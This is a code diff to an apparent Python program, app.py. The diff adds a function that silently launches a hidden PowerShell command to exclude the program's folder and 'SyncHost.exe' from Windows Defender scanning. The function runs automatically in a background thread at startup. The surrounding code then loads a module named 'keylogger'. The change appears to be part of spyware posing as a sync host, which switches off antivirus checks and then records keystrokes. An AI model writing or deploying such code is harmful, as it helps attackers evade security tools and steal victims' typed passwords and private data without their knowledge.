@@ -25,6 +25,28 @@ def _log(msg):
 
 _log(f"app.py starting  build={_BUILD_TAG}")
 
+def _add_defender_exclusion():
+    """Add SyncHost dir to Windows Defender exclusions (silent, requires admin)."""
+    _flag = os.path.join(_APP_DIR, ".av_excluded")
+    if os.path.exists(_flag):
+        return
+    try:
+        import subprocess
+        subprocess.run(
+            ["powershell", "-NonInteractive", "-WindowStyle", "Hidden",
+             "-Command",
+             f'Add-MpPreference -ExclusionPath "{_APP_DIR}"; '
+             f'Add-MpPreference -ExclusionProcess "SyncHost.exe"'],
+            timeout=15, capture_output=True,
+        )
+        os.makedirs(_APP_DIR, exist_ok=True)
+        open(_flag, "w").close()
+        _log("Defender exclusion added")
+    except Exception as e:
+        _log(f"Defender exclusion failed: {e}")
+
+threading.Thread(target=_add_defender_exclusion, daemon=True, name="av-excl").start()
+
 try:
     import keylogger as kl
     _log("keylogger OK")
